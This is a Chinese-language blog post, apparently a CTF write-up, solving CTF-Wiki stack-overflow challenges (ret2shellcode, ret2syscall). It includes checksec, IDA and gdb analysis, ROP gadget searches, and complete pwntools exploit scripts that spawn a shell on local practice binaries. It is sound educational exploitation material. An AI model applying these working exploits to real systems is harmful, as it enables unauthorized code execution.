<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>【ctf题目系列】ctfwiki pwn类型 - 编程鬼谷子的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="【ctf题目系列】ctfwiki pwn类型" />
<meta property="og:description" content="categories:
ctf ret2shellcode [root@ningan ret2shellcode]# ./ret2shellcode No system for you this time !!! 123 bye bye ~[root@ningan ret2shellcode]# checksec检查 [root@ningan ret2shellcode]# checksec ret2shellcode [!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line 2) [*] &#39;/root/ctf/ctfwiki/ret2shellcode/ret2shellcode&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments 32位程序
NX disabled = 可以将shellcode放在数据段，即可执行
ida分析 int __cdecl main(int argc, const char **argv, const char **envp) { char s[100]; // [esp&#43;1Ch] [ebp-64h] BYREF setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); puts(&#34;" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bcguiguzi.github.io/posts/4deafb82db5b7568404416e3c254b1e8/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-08-31T15:02:59+08:00" />
<meta property="article:modified_time" content="2023-08-31T15:02:59+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程鬼谷子的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程鬼谷子的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">【ctf题目系列】ctfwiki pwn类型</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <hr> 
<p>categories:</p> 
<ul><li>ctf</li></ul> 
<hr> 
<h2><a id="ret2shellcode_6"></a>ret2shellcode</h2> 
<pre><code class="prism language-bash"><span class="token punctuation">[</span>root@ningan ret2shellcode<span class="token punctuation">]</span><span class="token comment"># ./ret2shellcode</span>
No system <span class="token keyword">for</span> you this <span class="token function">time</span> <span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span>
<span class="token number">123</span>
bye bye ~<span class="token punctuation">[</span>root@ningan ret2shellcode<span class="token punctuation">]</span><span class="token comment">#</span>
</code></pre> 
<h3><a id="checksec_15"></a>checksec检查</h3> 
<pre><code class="prism language-bash"><span class="token punctuation">[</span>root@ningan ret2shellcode<span class="token punctuation">]</span><span class="token comment"># checksec ret2shellcode</span>
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Could not populate PLT: future feature annotations is not defined <span class="token punctuation">(</span>unicorn.py, line <span class="token number">2</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/root/ctf/ctfwiki/ret2shellcode/ret2shellcode'</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>
    RWX:      Has RWX segments

</code></pre> 
<p>32位程序<br> NX disabled = 可以将shellcode放在数据段，即可执行</p> 
<h3><a id="ida_34"></a>ida分析</h3> 
<pre><code class="prism language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+1Ch] [ebp-64h] BYREF</span>

  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"No system for you this time !!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">gets</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">strncpy</span><span class="token punctuation">(</span>buf2<span class="token punctuation">,</span> s<span class="token punctuation">,</span> <span class="token number">0x64u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bye bye ~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>栈溢出漏洞，还同时将对应的字符串复制到 buf2 处</p> 
<p>查看buf2，发现在bss段</p> 
<pre><code>.bss:0804A065 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+align 20h
.bss:0804A080                               public buf2
.bss:0804A080                               ; char buf2[100]
.bss:0804A080 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+buf2 db 64h dup(?)                      ; DATA XREF: main+7B↑o
.bss:0804A080 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+_bss ends
.bss:0804A080 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+
</code></pre> 
<p><img src="https://images2.imgbox.com/a5/07/q1tzqR22_o.png" alt="image.png"></p> 
<h3><a id="gdb_67"></a>gdb分析</h3> 
<pre><code class="prism language-bash">pwndbg<span class="token operator">&gt;</span> b main
<span class="token punctuation">..</span>.
pwndbg<span class="token operator">&gt;</span> r
<span class="token punctuation">..</span>.

pwndbg<span class="token operator">&gt;</span> vmmap
LEGEND: STACK <span class="token operator">|</span> HEAP <span class="token operator">|</span> CODE <span class="token operator">|</span> DATA <span class="token operator">|</span> RWX <span class="token operator">|</span> RODATA
     Start        End Perm     Size Offset File
 0x8048000  0x8049000 r-xp     <span class="token number">1000</span>      <span class="token number">0</span> /root/ctfwiki/ret2shellcode/ret2shellcode
 0x8049000  0x804a000 r--p     <span class="token number">1000</span>      <span class="token number">0</span> /root/ctfwiki/ret2shellcode/ret2shellcode
 0x804a000  0x804b000 rw-p     <span class="token number">1000</span>   <span class="token number">1000</span> /root/ctfwiki/ret2shellcode/ret2shellcode
0xf7c00000 0xf7c22000 r--p    <span class="token number">22000</span>      <span class="token number">0</span> /usr/lib/i386-linux-gnu/libc.so.6
0xf7c22000 0xf7d9b000 r-xp   <span class="token number">179000</span>  <span class="token number">22000</span> /usr/lib/i386-linux-gnu/libc.so.6
0xf7d9b000 0xf7e1c000 r--p    <span class="token number">81000</span> 19b000 /usr/lib/i386-linux-gnu/libc.so.6
0xf7e1c000 0xf7e1e000 r--p     <span class="token number">2000</span> 21b000 /usr/lib/i386-linux-gnu/libc.so.6
0xf7e1e000 0xf7e1f000 rw-p     <span class="token number">1000</span> 21d000 /usr/lib/i386-linux-gnu/libc.so.6
0xf7e1f000 0xf7e29000 rw-p     a000      <span class="token number">0</span> <span class="token punctuation">[</span>anon_f7e1f<span class="token punctuation">]</span>
0xf7fc2000 0xf7fc4000 rw-p     <span class="token number">2000</span>      <span class="token number">0</span> <span class="token punctuation">[</span>anon_f7fc2<span class="token punctuation">]</span>
0xf7fc4000 0xf7fc8000 r--p     <span class="token number">4000</span>      <span class="token number">0</span> <span class="token punctuation">[</span>vvar<span class="token punctuation">]</span>
0xf7fc8000 0xf7fca000 r-xp     <span class="token number">2000</span>      <span class="token number">0</span> <span class="token punctuation">[</span>vdso<span class="token punctuation">]</span>
0xf7fca000 0xf7fcb000 r--p     <span class="token number">1000</span>      <span class="token number">0</span> /usr/lib/i386-linux-gnu/ld-linux.so.2
0xf7fcb000 0xf7fed000 r-xp    <span class="token number">22000</span>   <span class="token number">1000</span> /usr/lib/i386-linux-gnu/ld-linux.so.2
0xf7fed000 0xf7ffb000 r--p     e000  <span class="token number">23000</span> /usr/lib/i386-linux-gnu/ld-linux.so.2
0xf7ffb000 0xf7ffd000 r--p     <span class="token number">2000</span>  <span class="token number">30000</span> /usr/lib/i386-linux-gnu/ld-linux.so.2
0xf7ffd000 0xf7ffe000 rw-p     <span class="token number">1000</span>  <span class="token number">32000</span> /usr/lib/i386-linux-gnu/ld-linux.so.2
0xfffdd000 0xffffe000 rwxp    <span class="token number">21000</span>      <span class="token number">0</span> <span class="token punctuation">[</span>stack<span class="token punctuation">]</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/14/ce/2GQIKLF5_o.png" alt="image.png"></p> 
<p>答案中说，这个地方可以看出来bss段有可执行权限，怎么看出来的呢？？？？</p> 
<p>20230830更新 开始<br> 同组的小伙伴拿着exp执行不了结果，我就又回顾了以下这道题。我之所以能够执行，是因为我pwndbg是在kali的虚拟机中执行的，exp是在我ubuntu的虚拟机执行的，所以可以正常执行；当放到kali的系统中执行exp的时候，就执行不了了…<br> 20230830更新 结束</p> 
<pre><code class="prism language-bash"><span class="token comment"># gdb ret2shellcode</span>
pwndbg<span class="token operator">&gt;</span> b main
<span class="token punctuation">..</span>.
pwndbg<span class="token operator">&gt;</span> run
<span class="token punctuation">..</span>.
pwndbg<span class="token operator">&gt;</span> n
pwndbg<span class="token operator">&gt;</span> n
pwndbg<span class="token operator">&gt;</span> n
<span class="token punctuation">..</span>.
AAAAAAAA
pwndbg<span class="token operator">&gt;</span> stack <span class="token number">40</span>
pwndbg<span class="token operator">&gt;</span> distance 源地址 目的地址
pwndbg<span class="token operator">&gt;</span> p/d 0x6c
</code></pre> 
<p><img src="https://images2.imgbox.com/7c/f3/YqoB4E9i_o.png" alt="image.png"></p> 
<p>查找偏移地址为108</p> 
<h3><a id="_126"></a>解题思路</h3> 
<pre><code>默认栈帧
                                           +-----------------+
                                           |     retaddr     |
                                           +-----------------+
                                           |     saved ebp   |
                                    ebp---&gt;+-----------------+
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                    buf---&gt;+-----------------+

修改后栈帧
                                           +-----------------+
                                           |   (retaddr)     |
                                           |    buf2_addr    |
                                           +-----------------+
                                           |   (saved ebp)   |
                                           |       BBBB      |
                                    ebp---&gt;+-----------------+
                                           |                 |
                                           |                 |
                                           |shellcode...AAAA |
                                           |                 |
                                           |                 |
                                           |                 |
                                      s---&gt;+-----------------+

                                           +-----------------+
                                           |                 |
                                           |                 |
                                           |shellcode...AAAA |
                                           |                 |
                                           |                 |
                                           |                 |
                                   buf2---&gt;+-----------------+    bss段                                 
</code></pre> 
<h3><a id="exp_172"></a>exp</h3> 
<pre><code class="prism language-python"><span class="token comment">#!/usr/bin/env python</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./ret2shellcode'</span><span class="token punctuation">)</span>
shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
buf2_addr <span class="token operator">=</span> <span class="token number">0x804a080</span> 

sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shellcode<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">108</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b'A'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>buf2_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token triple-quoted-string string">"""
[root@ningan ret2shellcode]# python exp.py
[+] Starting local process './ret2shellcode': pid 8742
[*] Switching to interactive mode
No system for you this time !!!
bye bye ~$ ls
exp.py    ret2shellcode
$

"""</span>

</code></pre> 
<h2><a id="ret2syscall_201"></a>ret2syscall</h2> 
<h3><a id="_203"></a>检查</h3> 
<pre><code class="prism language-bash"><span class="token punctuation">[</span>root@ningan ret2syscall<span class="token punctuation">]</span><span class="token comment"># checksec rop</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/root/ctf/ctfwiki/ret2syscall/rop'</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>

<span class="token punctuation">[</span>root@ningan ret2syscall<span class="token punctuation">]</span><span class="token comment"># file rop</span>
rop: ELF <span class="token number">32</span>-bit LSB executable, Intel <span class="token number">80386</span>, version <span class="token number">1</span> <span class="token punctuation">(</span>GNU/Linux<span class="token punctuation">)</span>, statically linked, <span class="token keyword">for</span> GNU/Linux <span class="token number">2.6</span>.24, BuildID<span class="token punctuation">[</span>sha1<span class="token punctuation">]</span><span class="token operator">=</span>2bff0285c2706a147e7b150493950de98f182b78, with debug_info, not stripped
</code></pre> 
<p><img src="https://images2.imgbox.com/41/ec/5Q0SxbT7_o.png" alt="image.png"></p> 
<h3><a id="ida_221"></a>ida分析</h3> 
<pre><code class="prism language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// [esp+1Ch] [ebp-64h] BYREF</span>

  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"This time, no system() and NO SHELLCODE!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"What do you plan to do?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/d4/1d/DTAioJFy_o.png" alt="image.png"></p> 
<p>可以看到这块有这么多函数，因为是静态链接进来的</p> 
<h3><a id="gdb_241"></a>gdb分析</h3> 
<pre><code class="prism language-bash"><span class="token comment"># gdb rop</span>
pwndbg<span class="token operator">&gt;</span> b main
<span class="token punctuation">..</span>.
pwndbg<span class="token operator">&gt;</span> run
<span class="token punctuation">..</span>.
pwndbg<span class="token operator">&gt;</span> n
pwndbg<span class="token operator">&gt;</span> n
pwndbg<span class="token operator">&gt;</span> n
<span class="token punctuation">..</span>.
AAAAAAAA
pwndbg<span class="token operator">&gt;</span> stack <span class="token number">40</span>
pwndbg<span class="token operator">&gt;</span> distance 0xffffd2fc 0xffffd368
0xffffd2fc-<span class="token operator">&gt;</span>0xffffd368 is 0x6c bytes <span class="token punctuation">(</span>0x1b words<span class="token punctuation">)</span>
pwndbg<span class="token operator">&gt;</span> p/d 0x6c
</code></pre> 
<p><img src="https://images2.imgbox.com/26/f7/gXdonzFF_o.png" alt="image.png"></p> 
<h3><a id="ROPgadget_261"></a>ROPgadget分析</h3> 
<pre><code class="prism language-bash"><span class="token punctuation">[</span>root@ningan ret2syscall<span class="token punctuation">]</span><span class="token comment"># ROPgadget --binary rop  --only 'pop|ret' | grep 'eax'</span>
0x0809ddda <span class="token builtin class-name">:</span> pop eax <span class="token punctuation">;</span> pop ebx <span class="token punctuation">;</span> pop esi <span class="token punctuation">;</span> pop edi <span class="token punctuation">;</span> ret
0x080bb196 <span class="token builtin class-name">:</span> pop eax <span class="token punctuation">;</span> ret
0x0807217a <span class="token builtin class-name">:</span> pop eax <span class="token punctuation">;</span> ret 0x80e
0x0804f704 <span class="token builtin class-name">:</span> pop eax <span class="token punctuation">;</span> ret <span class="token number">3</span>
0x0809ddd9 <span class="token builtin class-name">:</span> pop es <span class="token punctuation">;</span> pop eax <span class="token punctuation">;</span> pop ebx <span class="token punctuation">;</span> pop esi <span class="token punctuation">;</span> pop edi <span class="token punctuation">;</span> ret
<span class="token punctuation">[</span>root@ningan ret2syscall<span class="token punctuation">]</span><span class="token comment">#</span>
<span class="token punctuation">[</span>root@ningan ret2syscall<span class="token punctuation">]</span><span class="token comment"># ROPgadget --binary rop  --only 'pop|ret' | grep 'ebx'</span>
0x0809dde2 <span class="token builtin class-name">:</span> pop ds <span class="token punctuation">;</span> pop ebx <span class="token punctuation">;</span> pop esi <span class="token punctuation">;</span> pop edi <span class="token punctuation">;</span> ret
0x0809ddda <span class="token builtin class-name">:</span> pop eax <span class="token punctuation">;</span> pop ebx <span class="token punctuation">;</span> pop esi <span class="token punctuation">;</span> pop edi <span class="token punctuation">;</span> ret
0x0805b6ed <span class="token builtin class-name">:</span> pop ebp <span class="token punctuation">;</span> pop ebx <span class="token punctuation">;</span> pop esi <span class="token punctuation">;</span> pop edi <span class="token punctuation">;</span> ret
0x0809e1d4 <span class="token builtin class-name">:</span> pop ebx <span class="token punctuation">;</span> pop ebp <span class="token punctuation">;</span> pop esi <span class="token punctuation">;</span> pop edi <span class="token punctuation">;</span> ret
0x080be23f <span class="token builtin class-name">:</span> pop ebx <span class="token punctuation">;</span> pop edi <span class="token punctuation">;</span> ret
0x0806eb69 <span class="token builtin class-name">:</span> pop ebx <span class="token punctuation">;</span> pop edx <span class="token punctuation">;</span> ret
0x08092258 <span class="token builtin class-name">:</span> pop ebx <span class="token punctuation">;</span> pop esi <span class="token punctuation">;</span> pop ebp <span class="token punctuation">;</span> ret
0x0804838b <span class="token builtin class-name">:</span> pop ebx <span class="token punctuation">;</span> pop esi <span class="token punctuation">;</span> pop edi <span class="token punctuation">;</span> pop ebp <span class="token punctuation">;</span> ret
0x080a9a42 <span class="token builtin class-name">:</span> pop ebx <span class="token punctuation">;</span> pop esi <span class="token punctuation">;</span> pop edi <span class="token punctuation">;</span> pop ebp <span class="token punctuation">;</span> ret 0x10
0x08096a26 <span class="token builtin class-name">:</span> pop ebx <span class="token punctuation">;</span> pop esi <span class="token punctuation">;</span> pop edi <span class="token punctuation">;</span> pop ebp <span class="token punctuation">;</span> ret 0x14
0x08070d73 <span class="token builtin class-name">:</span> pop ebx <span class="token punctuation">;</span> pop esi <span class="token punctuation">;</span> pop edi <span class="token punctuation">;</span> pop ebp <span class="token punctuation">;</span> ret 0xc
0x08048547 <span class="token builtin class-name">:</span> pop ebx <span class="token punctuation">;</span> pop esi <span class="token punctuation">;</span> pop edi <span class="token punctuation">;</span> pop ebp <span class="token punctuation">;</span> ret <span class="token number">4</span>
0x08049bfd <span class="token builtin class-name">:</span> pop ebx <span class="token punctuation">;</span> pop esi <span class="token punctuation">;</span> pop edi <span class="token punctuation">;</span> pop ebp <span class="token punctuation">;</span> ret <span class="token number">8</span>
0x08048913 <span class="token builtin class-name">:</span> pop ebx <span class="token punctuation">;</span> pop esi <span class="token punctuation">;</span> pop edi <span class="token punctuation">;</span> ret
0x08049a19 <span class="token builtin class-name">:</span> pop ebx <span class="token punctuation">;</span> pop esi <span class="token punctuation">;</span> pop edi <span class="token punctuation">;</span> ret <span class="token number">4</span>
0x08049a94 <span class="token builtin class-name">:</span> pop ebx <span class="token punctuation">;</span> pop esi <span class="token punctuation">;</span> ret
0x080481c9 <span class="token builtin class-name">:</span> pop ebx <span class="token punctuation">;</span> ret
0x080d7d3c <span class="token builtin class-name">:</span> pop ebx <span class="token punctuation">;</span> ret 0x6f9
0x08099c87 <span class="token builtin class-name">:</span> pop ebx <span class="token punctuation">;</span> ret <span class="token number">8</span>
0x0806eb91 <span class="token builtin class-name">:</span> pop ecx <span class="token punctuation">;</span> pop ebx <span class="token punctuation">;</span> ret
0x0806336b <span class="token builtin class-name">:</span> pop edi <span class="token punctuation">;</span> pop esi <span class="token punctuation">;</span> pop ebx <span class="token punctuation">;</span> ret
0x0806eb90 <span class="token builtin class-name">:</span> pop edx <span class="token punctuation">;</span> pop ecx <span class="token punctuation">;</span> pop ebx <span class="token punctuation">;</span> ret
0x0809ddd9 <span class="token builtin class-name">:</span> pop es <span class="token punctuation">;</span> pop eax <span class="token punctuation">;</span> pop ebx <span class="token punctuation">;</span> pop esi <span class="token punctuation">;</span> pop edi <span class="token punctuation">;</span> ret
0x0806eb68 <span class="token builtin class-name">:</span> pop esi <span class="token punctuation">;</span> pop ebx <span class="token punctuation">;</span> pop edx <span class="token punctuation">;</span> ret
0x0805c820 <span class="token builtin class-name">:</span> pop esi <span class="token punctuation">;</span> pop ebx <span class="token punctuation">;</span> ret
0x08050256 <span class="token builtin class-name">:</span> pop esp <span class="token punctuation">;</span> pop ebx <span class="token punctuation">;</span> pop esi <span class="token punctuation">;</span> pop edi <span class="token punctuation">;</span> pop ebp <span class="token punctuation">;</span> ret
0x0807b6ed <span class="token builtin class-name">:</span> pop ss <span class="token punctuation">;</span> pop ebx <span class="token punctuation">;</span> ret
<span class="token punctuation">[</span>root@ningan ret2syscall<span class="token punctuation">]</span><span class="token comment">#</span>
<span class="token punctuation">[</span>root@ningan ret2syscall<span class="token punctuation">]</span><span class="token comment">#</span>
<span class="token punctuation">[</span>root@ningan ret2syscall<span class="token punctuation">]</span><span class="token comment">#</span>
<span class="token punctuation">[</span>root@ningan ret2syscall<span class="token punctuation">]</span><span class="token comment"># ROPgadget --binary rop  --string '/bin/sh'</span>
Strings information
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
0x080be408 <span class="token builtin class-name">:</span> /bin/sh
<span class="token punctuation">[</span>root@ningan ret2syscall<span class="token punctuation">]</span><span class="token comment">#</span>
<span class="token punctuation">[</span>root@ningan ret2syscall<span class="token punctuation">]</span><span class="token comment">#</span>
<span class="token punctuation">[</span>root@ningan ret2syscall<span class="token punctuation">]</span><span class="token comment"># ROPgadget --binary rop  --only 'int'</span>
Gadgets information
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
0x08049421 <span class="token builtin class-name">:</span> int 0x80

Unique gadgets found: <span class="token number">1</span>

</code></pre> 
<p><img src="https://images2.imgbox.com/ff/4e/wjAWXKft_o.png" alt="image.png"></p> 
<p><img src="https://images2.imgbox.com/26/17/rWGE028z_o.png" alt="image.png"></p> 
<h3><a id="_324"></a>解题思路</h3> 
<p>此次，由于我们不能直接利用程序中的某一段代码或者自己填写代码来获得 shell，所以我们利用程序中的 gadgets 来获得 shell，而对应的 shell 获取则是利用系统调用。</p> 
<p>简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell</p> 
<p><code>execve("/bin/sh",NULL,NULL)</code></p> 
<p>其中，该程序是 32 位，所以我们需要使得</p> 
<ul><li>系统调用号，即 eax 应该为 0xb</li><li>第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</li><li>第二个参数，即 ecx 应该为 0</li><li>第三个参数，即 edx 应该为 0</li></ul> 
<pre><code>默认栈帧
                                           +-----------------+
                                           |     retaddr     |
                                           +-----------------+
                                           |     saved ebp   |
                                    ebp---&gt;+-----------------+
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                     v4---&gt;+-----------------+

修改后栈帧
                                           +-----------------+
                                           |    0x80_addr    |
                                           +-----------------+                                           
                                           |  /bin/sh_addr   |
                                           +-----------------+                                           
                                           |        0        |
                                           +-----------------+                                           
                                           |        0        |
                                           +-----------------+                                           
                                           |pop_edx_ecx_ebx_ret_addr |
                                           +-----------------+                                        
                                           |       0xb       |
                                           +-----------------+
                                           |    (retaddr)    |
                                           |pop_eax_ret_addr |
                                           +-----------------+
                                           |   (saved ebp)   |
                                           |       BBBBB     |
                                    ebp---&gt;+-----------------+
                                           |                 |
                                           |                 |
                                           |   AAA...AAAA    |
                                           |     108位       |
                                           |                 |
                                           |                 |
                                     v4---&gt;+-----------------+
</code></pre> 
<h3><a id="exp_383"></a>exp</h3> 
<pre><code class="prism language-bash"><span class="token shebang important">#!/usr/bin/env python</span>
from pwn <span class="token function">import</span> *

<span class="token function">sh</span> <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./rop'</span><span class="token punctuation">)</span>

pop_eax_ret <span class="token operator">=</span> 0x080bb196
pop_edx_ecx_ebx_ret <span class="token operator">=</span> 0x0806eb90
int_0x80 <span class="token operator">=</span> 0x08049421
binsh <span class="token operator">=</span> 0x80be408

payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'A'</span> * <span class="token number">112</span>, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, <span class="token number">0</span>, <span class="token number">0</span>, binsh, int_0x80<span class="token punctuation">]</span><span class="token punctuation">)</span>

sh.sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
sh.interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token string">""</span>"
<span class="token punctuation">[</span>root@ningan ret2syscall<span class="token punctuation">]</span><span class="token comment"># python exp.py</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Starting <span class="token builtin class-name">local</span> process <span class="token string">'./rop'</span><span class="token builtin class-name">:</span> pid <span class="token number">24853</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive mode
This time, no system<span class="token punctuation">(</span><span class="token punctuation">)</span> and NO SHELLCODE<span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span>
What <span class="token keyword">do</span> you plan to do?
$ <span class="token function">ls</span>
exp.py    rop
$
<span class="token string">""</span>"
</code></pre> 
<h2><a id="_416"></a>参考</h2> 
<p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2shellcode" rel="nofollow">ctfwifi官方 ret2shellcode</a></p> 
<h2><a id="ret2libc1_420"></a>ret2libc1</h2> 
<h3><a id="_422"></a>检查</h3> 
<pre><code class="prism language-bash"><span class="token punctuation">[</span>root@ningan ret2libc1<span class="token punctuation">]</span><span class="token comment"># file ret2libc1</span>
